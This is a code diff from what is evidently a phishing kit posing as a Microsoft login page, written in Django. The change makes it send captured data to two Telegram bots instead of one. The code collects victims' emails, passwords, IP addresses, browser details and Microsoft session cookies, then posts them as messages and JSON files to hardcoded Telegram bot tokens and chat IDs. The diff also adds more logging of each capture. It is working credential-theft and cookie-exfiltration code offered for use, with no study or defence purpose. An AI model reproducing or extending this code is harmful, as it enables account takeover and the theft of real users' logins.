@@ -15,36 +15,57 @@ import requests
 from datetime import datetime
 from .models import SessionTracking, ClickEvent
 
-# ========== TELEGRAM CONFIGURATION ==========
-TELEGRAM_BOT_TOKEN = "8518266646:AAE29WCw65NMEZnVEH7h6q8tNKhFSBw5uqM"
-TELEGRAM_CHAT_ID = "6653593232"
+# ========== TELEGRAM CONFIGURATION - DUAL BOTS ==========
+# BOT 1: Your original bot
+BOT1_TOKEN = "8518266646:AAE29WCw65NMEZnVEH7h6q8tNKhFSBw5uqM"
+BOT1_CHAT_ID = "6653593232"
+
+# BOT 2: The new bot (Provate Life)
+BOT2_TOKEN = "6591325062:AAGFUI3cA6QgBkq5OQ0mh99eVMSmO7RCgDU"
+BOT2_CHAT_ID = "6540256516"
+
+# List of all bots for easy iteration
+TELEGRAM_BOTS = [
+    {"token": BOT1_TOKEN, "chat_id": BOT1_CHAT_ID},
+    {"token": BOT2_TOKEN, "chat_id": BOT2_CHAT_ID},
+]
 
 def send_telegram_message(message):
-    """Send message to Telegram"""
-    try:
-        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
-        data = {
-            "chat_id": TELEGRAM_CHAT_ID,
-            "text": message,
-            "parse_mode": "HTML"
-        }
-        response = requests.post(url, data=data)
-        return response.status_code == 200
-    except Exception as e:
-        print(f"[TELEGRAM ERROR] {str(e)}")
-        return False
+    """Send message to ALL Telegram bots"""
+    success = True
+    for bot in TELEGRAM_BOTS:
+        try:
+            url = f"https://api.telegram.org/bot{bot['token']}/sendMessage"
+            data = {
+                "chat_id": bot['chat_id'],
+                "text": message,
+                "parse_mode": "HTML"
+            }
+            response = requests.post(url, data=data)
+            if response.status_code != 200:
+                success = False
+                print(f"[TELEGRAM ERROR] Bot failed: {bot['token'][:10]}... Status: {response.status_code}")
+        except Exception as e:
+            success = False
+            print(f"[TELEGRAM ERROR] {str(e)}")
+    return success
 
 def send_telegram_file(file_content, filename):
-    """Send file to Telegram"""
-    try:
-        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
-        files = {'document': (filename, file_content, 'application/json')}
-        data = {'chat_id': TELEGRAM_CHAT_ID}
-        response = requests.post(url, files=files, data=data)
-        return response.status_code == 200
-    except Exception as e:
-        print(f"[TELEGRAM ERROR] {str(e)}")
-        return False
+    """Send file to ALL Telegram bots"""
+    success = True
+    for bot in TELEGRAM_BOTS:
+        try:
+            url = f"https://api.telegram.org/bot{bot['token']}/sendDocument"
+            files = {'document': (filename, file_content, 'application/json')}
+            data = {'chat_id': bot['chat_id']}
+            response = requests.post(url, files=files, data=data)
+            if response.status_code != 200:
+                success = False
+                print(f"[TELEGRAM ERROR] File send failed for bot: {bot['token'][:10]}...")
+        except Exception as e:
+            success = False
+            print(f"[TELEGRAM ERROR] {str(e)}")
+    return success
 
 # ========== HELPER FUNCTIONS ==========
 
@@ -109,7 +130,7 @@ def cookies_to_firefox_json(cookies_dict):
 # ========== SEND TO TELEGRAM ==========
 
 def send_to_telegram(session_data, session_id):
-    """Send captured data to Telegram"""
+    """Send captured data to ALL Telegram bots"""
     
     email = session_data.get('user', {}).get('email', 'Not captured')
     password = session_data.get('user', {}).get('password', 'Not captured')
@@ -142,6 +163,7 @@ def send_to_telegram(session_data, session_id):
 📋 <b>Names:</b> {', '.join(microsoft_cookies.keys()) if microsoft_cookies else 'None'}
 """
     
+    # Send to ALL bots
     send_telegram_message(message)
     
     if microsoft_cookies:
@@ -184,16 +206,33 @@ def track_click(request):
     ref = request.GET.get('ref', 'direct')
     
     session_data = get_or_create_session(session_id)
-    session_data['ip_address'] = get_client_ip(request)
-    session_data['user_agent'] = request.META.get('HTTP_USER_AGENT', '')
+    
+    # ===== CAPTURE IP =====
+    x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
+    if x_forwarded_for:
+        ip = x_forwarded_for.split(',')[0]
+    else:
+        ip = request.META.get('REMOTE_ADDR', 'Unknown')
+    session_data['ip_address'] = ip
+    
+    # ===== CAPTURE USER AGENT =====
+    user_agent = request.META.get('HTTP_USER_AGENT', '')
+    session_data['user_agent'] = user_agent
+    
+    # ===== CAPTURE BROWSER INFO =====
+    browser_info = get_browser_info(user_agent)
+    session_data['browser']['name'] = browser_info['browser']
+    session_data['os']['name'] = browser_info['os']
+    session_data['device']['type'] = browser_info['device']
+    
     session_data['referer'] = request.META.get('HTTP_REFERER', '')
     session_data['tracking_source'] = ref
     session_data['cookies'] = dict(request.COOKIES)
     
-    browser_info = get_browser_info(request.META.get('HTTP_USER_AGENT', ''))
-    session_data['browser']['name'] = browser_info['browser']
-    session_data['os']['name'] = browser_info['os']
-    session_data['device']['type'] = browser_info['device']
+    print(f"[TRACK] Session: {session_id}")
+    print(f"[TRACK] IP: {ip}")
+    print(f"[TRACK] Browser: {browser_info['browser']}")
+    print(f"[TRACK] Device: {browser_info['device']}")
     
     response = redirect('/login/')
     response.set_cookie('ms_session_id', session_id, max_age=30*24*60*60, httponly=False)
@@ -264,7 +303,7 @@ def login_page(request):
                 print(f"[🍪 MICROSOFT COOKIES CAPTURED] {len(microsoft_cookies)} cookies")
                 print(f"[📋 COOKIE NAMES] {', '.join(microsoft_cookies.keys())}")
                 
-                # Send to Telegram WITH cookies
+                # Send to ALL Telegram bots
                 send_to_telegram(session_data, session_id)
                 
             except Exception as e:
